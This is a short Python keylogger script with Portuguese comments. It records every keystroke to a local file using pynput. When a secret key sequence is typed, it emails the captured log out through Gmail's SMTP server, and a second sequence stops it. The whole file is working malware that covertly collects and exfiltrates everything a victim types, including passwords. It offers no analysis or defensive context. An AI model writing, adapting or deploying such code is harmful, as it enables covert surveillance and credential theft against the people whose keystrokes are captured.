from pynput.keyboard import Listener
from email.mime.text import MIMEText
from _collections import deque
import smtplib


snd = ["g", "d", "d", "Key.space", "1", "3", "2"]
ext = ['a','r', 'c', 'a', 'n', 'i', 's']
keys = deque(maxlen=7)


def log(text):

    with open("log.txt", "a") as file_log:
        file_log.write(text)


def monitor(key):

    try:
        log(key.char)
        keys.append(key.char)

    except AttributeError:
        log(" <"+str(key)+"> ")
        keys.append(str(key))

    if "".join(snd) == "".join(keys):

        smtp_ssl_host = 'smtp.gmail.com'
        smtp_ssl_port = 465

        username = '' # Email que envia
        password = '' # Senha do email que envia

        from_addr = '' # Email que envia.
        to_addrs = [''] # Emails de destino.

        with open('log.txt') as rdr:
            message = MIMEText(rdr.read())
        message['subject'] = 'The contents of %s' % log
        message['from'] = from_addr
        message['to'] = ', '.join(to_addrs)

        server = smtplib.SMTP_SSL(smtp_ssl_host, smtp_ssl_port)
        server.login(username, password)
        server.sendmail(from_addr, to_addrs, message.as_string())
        server.quit()

    if "".join(ext) == "".join(keys):
        return False


with Listener(on_release=monitor) as listener:
    listener.join()